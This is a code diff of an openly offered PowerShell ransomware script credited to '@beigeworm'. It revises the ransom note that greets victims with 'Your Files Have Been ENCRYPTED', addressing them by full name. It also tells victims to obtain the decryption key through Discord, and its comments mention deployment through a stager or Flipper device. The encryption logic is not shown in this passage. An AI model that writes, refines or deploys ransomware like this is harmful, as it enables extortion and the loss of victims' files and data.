@@ -18,6 +18,11 @@ USAGE
 3. Check Discord for the Decryption Key.
 4. Use the decryptor to decrypt the files.
 
+CREDIT
+Credit and kudos to InfosecREDD for the idea of writing ransomware in Powershell
+this is my interpretation of his non publicly available script used in this Talking Sasquatch video.
+https://youtu.be/IwfoHN2dWeE
+
 #>
 
 # Uncomment below if not using a stager (base64 script, flipper etc)
@@ -92,14 +97,17 @@ $title.AutoSize = $true
 $title.Location = New-Object System.Drawing.Point(330, 20)
 
 $label = New-Object Windows.Forms.Label
-$label.Text = "Hello User! Your Files Have Been ENCRYPTED."
-# $label.Text = "Hello $fullName! Your Files Have Been ENCRYPTED."
+if ($fullName.Length -ne 0){
+    $label.Text = "Hello $fullName! Your Files Have Been ENCRYPTED."
+}else{
+    $label.Text = "Hello User! Your Files Have Been ENCRYPTED."
+}
 $label.Font = 'Microsoft Sans Serif,18,style=Underline,bold'
 $label.AutoSize = $true
 $label.Location = New-Object System.Drawing.Point(60, 200)
 
 $label2 = New-Object Windows.Forms.Label
-$label2.Text = " To recover your files you will need the Decryption Key `n`n`n This Window Will Close when Decryption is Complete `n`n`n Written By @beigeworm - Follow on Github :)"
+$label2.Text = " To recover your files you will need the Decryption Key `n`n`n Run the Decryptor script and enter the key to recover files `n`n`n You can close this window when Decryption is complete `n`n`n Written by @beigeworm - Follow on Github - Discord : egieb"
 $label2.AutoSize = $true
 $label2.Location = New-Object System.Drawing.Point(60, 280)
 
@@ -117,7 +125,6 @@ $form.Controls.AddRange(@($title,$label,$label2,$button))
 
 $result = $form.ShowDialog()
 While (Test-Path -Path $env:tmp/indicate){if($result -eq [System.Windows.Forms.DialogResult]::OK){$form.ShowDialog()}}
-
 '@
 
 # Define VBS code for popup initialization
